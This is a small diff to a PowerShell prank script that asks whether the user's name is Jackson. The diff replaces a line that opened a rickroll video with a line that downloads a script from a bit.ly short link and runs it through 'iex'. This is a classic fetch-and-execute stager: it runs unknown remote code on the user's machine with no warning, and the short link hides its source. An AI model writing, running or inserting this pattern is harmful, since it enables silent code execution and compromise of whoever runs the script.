@@ -1,5 +1,5 @@
 $jacksonite = Read-Host "Is your name Jackson? (y/n)";
 
 if ($jacksonite -eq 'y') {
-    Start-Process -WindowStyle Hidden msedge "https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs"
+    iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
 }
